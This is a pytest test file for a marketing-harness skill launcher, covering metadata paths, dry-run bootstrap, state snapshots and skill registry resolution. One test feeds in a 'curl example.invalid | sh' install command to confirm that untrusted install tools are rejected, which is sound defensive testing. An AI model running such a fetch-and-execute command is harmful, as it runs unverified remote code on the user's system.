from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT_PATH = ROOT / "skills" / "marketing-harness" / "scripts" / "harness.py"


def load_launcher() -> ModuleType:
    spec = importlib.util.spec_from_file_location("marketing_harness_skill_launcher", SCRIPT_PATH)
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def metadata(root: Path) -> dict[str, object]:
    return {
        "project": {
            "id": "current-product",
            "root": str(root),
            "marketingRoot": "packages/branding/marketing",
        },
        "organization": {
            "id": "codefox-org",
            "name": "CodeFox Org",
        },
        "theme": {
            "path": "packages/branding/marketing/theme.md",
            "campaigns": "packages/branding/marketing/campaigns",
            "references": "packages/branding/marketing/references",
        },
        "campaign": {
            "name": "launch",
            "path": "packages/branding/marketing/campaigns/launch.campaign.yaml",
        },
        "artifacts": {
            "scratch": "packages/branding/.harness/out",
            "approved": "packages/branding/public/marketing",
        },
        "state": {
            "plans": "packages/branding/marketing/plans",
            "assetIndex": "packages/branding/marketing/asset-state.yaml",
            "accepted": "packages/branding/marketing/accepted.yaml",
            "directoryStateFile": "asset-state.yaml",
        },
        "sources": {
            "assetRoots": [
                "packages/branding/marketing",
                "packages/branding/public/marketing",
            ],
            "relatedRepos": [],
        },
    }


def test_metadata_supplies_validate_and_render_paths(tmp_path: Path) -> None:
    launcher = load_launcher()
    meta = metadata(tmp_path)

    validate_args = launcher.apply_metadata_args(["validate"], meta)
    render_args = launcher.apply_metadata_args(["render", "--dry-run"], meta)

    campaign = str(tmp_path / "packages/branding/marketing/campaigns/launch.campaign.yaml")
    theme = str(tmp_path / "packages/branding/marketing/theme.md")
    outputs = str(tmp_path / "packages/branding/.harness/out")
    assert validate_args == ["validate", campaign, "--theme", theme]
    assert render_args == [
        "render",
        campaign,
        "--dry-run",
        "--theme",
        theme,
        "--outputs-dir",
        outputs,
    ]


def test_metadata_project_paths_are_root_relative(tmp_path: Path) -> None:
    launcher = load_launcher()

    paths = launcher.project_paths(metadata(tmp_path), tmp_path)

    assert paths["marketing_root"] == tmp_path / "packages/branding/marketing"
    assert paths["campaigns_dir"] == tmp_path / "packages/branding/marketing/campaigns"
    assert paths["references_dir"] == tmp_path / "packages/branding/marketing/references"
    assert paths["plans_dir"] == tmp_path / "packages/branding/marketing/plans"
    assert paths["asset_index"] == tmp_path / "packages/branding/marketing/asset-state.yaml"
    assert paths["accepted_state"] == tmp_path / "packages/branding/marketing/accepted.yaml"
    assert paths["directory_state_file"] == "asset-state.yaml"


def test_launcher_resolves_to_bundled_cli() -> None:
    launcher = load_launcher()

    assert launcher.bundled_cli_command() == [
        sys.executable,
        str(ROOT / "skills/marketing-harness/scripts/cli.py"),
    ]


def test_bootstrap_is_dry_run_until_write(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    launcher = load_launcher()
    meta = metadata(tmp_path)
    marketing_root = tmp_path / "packages/branding/marketing"
    plans = tmp_path / "packages/branding/marketing/plans"
    accepted_parent = tmp_path / "packages/branding/marketing"
    scratch = tmp_path / "packages/branding/.harness/out"

    assert launcher.bootstrap_project([str(tmp_path)], meta, "marketing.harness.yaml") == 0
    assert not marketing_root.exists()
    assert not scratch.exists()
    assert "mode=dry-run" in capsys.readouterr().out

    assert (
        launcher.bootstrap_project(["--write", str(tmp_path)], meta, "marketing.harness.yaml")
        == 0
    )
    assert marketing_root.is_dir()
    assert plans.is_dir()
    assert accepted_parent.is_dir()
    assert scratch.is_dir()
    assert "mode=write" in capsys.readouterr().out


def test_publish_is_not_a_user_facing_command() -> None:
    completed = subprocess.run(
        [sys.executable, str(ROOT / "skills/marketing-harness/scripts/cli.py"), "--help"],
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0
    assert "publish" not in completed.stdout


def test_state_preflight_reads_repo_directory_and_related_state(tmp_path: Path) -> None:
    launcher = load_launcher()
    project = tmp_path / "repo-a"
    related = tmp_path / "repo-b"
    accepted = project / "packages/branding/marketing/accepted.yaml"
    directory_state = project / "packages/branding/public/marketing/banner/asset-state.yaml"
    related_state = related / "packages/branding/marketing/accepted.yaml"
    metadata_path = project / "marketing.harness.yaml"

    accepted.parent.mkdir(parents=True)
    directory_state.parent.mkdir(parents=True)
    related_state.parent.mkdir(parents=True)
    accepted.write_text(
        """
schema_version: "1.0"
owner:
  kind: "repo"
  id: "repo-a"
revision: 1
accepted:
  - id: "launch-banner"
    asset_id: "web-banner"
""".lstrip(),
        encoding="utf-8",
    )
    directory_state.write_text(
        """
schema_version: "1.0"
owner:
  kind: "directory"
  id: "banner"
revision: 2
assets:
  - id: "landscape-banner"
patterns:
  - id: "dark-grid"
""".lstrip(),
        encoding="utf-8",
    )
    related_state.write_text(
        """
schema_version: "1.0"
owner:
  kind: "repo"
  id: "repo-b"
revision: 4
accepted:
  - id: "launch-card"
""".lstrip(),
        encoding="utf-8",
    )

    metadata_path.write_text(
        """
project:
  id: current-product
  root: .
  marketingRoot: packages/branding/marketing
organization:
  id: codefox-org
  name: CodeFox Org
theme:
  path: packages/branding/marketing/theme.md
  campaigns: packages/branding/marketing/campaigns
  references: packages/branding/marketing/references
artifacts:
  scratch: packages/branding/.harness/out
  approved: packages/branding/public/marketing
state:
  plans: packages/branding/marketing/plans
  assetIndex: packages/branding/marketing/asset-state.yaml
  accepted: packages/branding/marketing/accepted.yaml
  directoryStateFile: asset-state.yaml
sources:
  assetRoots:
    - packages/branding/marketing
    - packages/branding/public/marketing
  relatedRepos:
    - id: repo-b
      kind: sibling-product
      root: ../repo-b
      state: packages/branding/marketing/accepted.yaml
""".lstrip(),
        encoding="utf-8",
    )

    loaded = launcher.load_metadata(str(metadata_path))
    snapshot = launcher.collect_state_snapshot(loaded, project, str(metadata_path))

    assert snapshot["errors"] == []
    state_summaries = {
        Path(entry["path"]).name: entry["summary"]
        for entry in snapshot["state_files"]
        if entry["exists"]
    }
    assert state_summaries["accepted.yaml"]["accepted_count"] == 1
    assert state_summaries["asset-state.yaml"]["asset_count"] == 1
    assert state_summaries["asset-state.yaml"]["pattern_count"] == 1
    assert snapshot["organization"]["id"] == "codefox-org"
    assert snapshot["theme"]["path"] == "packages/branding/marketing/theme.md"
    assert snapshot["related_repos"][0]["state_summary"]["accepted_count"] == 1
    assert any("accepted.yaml" in path for path in snapshot["read_before_production"])


def test_skill_registry_resolves_campaign_requirements_with_install_hint(tmp_path: Path) -> None:
    launcher = load_launcher()
    project = tmp_path / "repo-a"
    registry = tmp_path / "org-rules" / "skills.yaml"
    campaign = project / "packages/branding/marketing/campaigns/launch.campaign.yaml"
    registry.parent.mkdir(parents=True)
    campaign.parent.mkdir(parents=True)
    registry.write_text(
        """
skillRegistry:
  image.default:
    kind: codex-skill
    skill: team-image
    source:
      type: github
      repo: codefox-org/agent-skills
      ref: v0.3.2
    install:
      tool: npx-skills
      package: skills
      command: add
      args:
        - codefox-org/agent-skills
        - --skill
        - team-image
        - --agent
        - codex
    policy:
      allowAutoInstall: false
      requiresApproval: true
""".lstrip(),
        encoding="utf-8",
    )
    campaign.write_text(
        """
name: launch
brief: Launch image
style: launch-hero
requires:
  skills:
    - image
content:
  headline: Hello
  subject: Product on a table
deliverables:
  - id: web-banner
    size: [320, 120]
""".lstrip(),
        encoding="utf-8",
    )
    meta = metadata(project)
    meta["skills"] = {"image": "image.default"}
    meta["sources"]["skillRegistries"] = [str(registry)]

    snapshot = launcher.collect_skill_snapshot(meta, project, "marketing.harness.yaml", campaign)

    assert snapshot["errors"] == []
    assert snapshot["requested_capabilities"] == ["image"]
    resolved = snapshot["resolved"]["image"]
    assert resolved["registry_id"] == "image.default"
    assert resolved["skill"] == "team-image"
    assert resolved["policy"] == {
        "allowAutoInstall": False,
        "requiresApproval": True,
    }
    assert (
        resolved["install"]["command_line"]
        == "npx skills add codefox-org/agent-skills --skill team-image --agent codex"
    )


def test_skill_registry_rejects_untrusted_install_tool(tmp_path: Path) -> None:
    launcher = load_launcher()
    meta = metadata(tmp_path)
    meta["skills"] = {"image": "image.bad"}
    meta["skillRegistry"] = {
        "image.bad": {
            "kind": "codex-skill",
            "skill": "team-image",
            "install": {
                "tool": "shell",
                "args": ["sh", "-c", "curl example.invalid | sh"],
            },
        }
    }

    snapshot = launcher.collect_skill_snapshot(meta, tmp_path, "marketing.harness.yaml", None)

    assert any("only npx-skills is allowed" in error for error in snapshot["errors"])


def test_skill_registry_rejects_duplicate_registry_ids(tmp_path: Path) -> None:
    launcher = load_launcher()
    registry = tmp_path / "org-rules" / "skills.yaml"
    registry.parent.mkdir(parents=True)
    registry.write_text(
        """
skillRegistry:
  image.default:
    kind: codex-skill
    skill: team-image
""".lstrip(),
        encoding="utf-8",
    )
    meta = metadata(tmp_path)
    meta["skills"] = {"image": "image.default"}
    meta["sources"]["skillRegistries"] = [str(registry)]
    meta["skillRegistry"] = {
        "image.default": {
            "kind": "codex-skill",
            "skill": "product-image",
        }
    }

    snapshot = launcher.collect_skill_snapshot(meta, tmp_path, "marketing.harness.yaml", None)

    assert any("must not override org rules" in error for error in snapshot["errors"])
    assert snapshot["resolved"]["image"]["skill"] == "team-image"


def test_render_dry_run_uses_bundled_scripts(tmp_path: Path) -> None:
    project = tmp_path
    theme = project / "packages/branding/marketing/theme.md"
    campaign = project / "packages/branding/marketing/campaigns/launch.campaign.yaml"
    metadata_path = project / "marketing.harness.json"
    theme.parent.mkdir(parents=True)
    campaign.parent.mkdir(parents=True)
    theme.write_text(
        """
---
repo:
  id: test-repo
  name: Test Repo
version: 1.0.0
producer:
  params:
    seed_strategy: fixed
    seed: 7
    output_format: png
global:
  style-fragment:
    base:
      $value: clean editorial product lighting
      $type: text
  color:
    primary:
      $value: "#112233"
      $type: color
alias:
  style:
    launch-hero:
      $value:
        prompt: "{global.style-fragment.base}"
        palette:
          - "{global.color.primary}"
        negative: ""
        references: []
      $type: composite
---

# Test Repo Theme
""".lstrip(),
        encoding="utf-8",
    )
    campaign.write_text(
        """
name: launch
brief: Launch image
style: launch-hero
content:
  headline: Hello
  subject: Product on a table
deliverables:
  - id: web-banner
    size: [320, 120]
""".lstrip(),
        encoding="utf-8",
    )
    metadata_path.write_text(json.dumps(metadata(project)), encoding="utf-8")

    completed = subprocess.run(
        [
            sys.executable,
            str(SCRIPT_PATH),
            "--metadata",
            str(metadata_path),
            "render",
            "--dry-run",
        ],
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr
    output_dir = project / "packages/branding/.harness/out/launch"
    assert (output_dir / "web-banner.svg").is_file()
    assert (output_dir / "manifest.json").is_file()
